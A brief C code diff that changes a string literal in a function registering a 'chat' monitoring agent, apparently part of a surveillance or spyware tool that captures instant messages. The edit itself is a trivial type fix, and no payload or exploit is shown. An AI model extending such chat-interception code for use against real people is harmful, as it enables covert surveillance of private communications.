@@ -450,5 +450,5 @@ DWORD WINAPI PM_IMInit(JSONObject elem)
 void PM_IMRegister()
 {
 	shared.bPM_IMStarted = FALSE;
-	AM_MonitorRegister(L"chat", PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);
+	AM_MonitorRegister("chat", PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);
 }
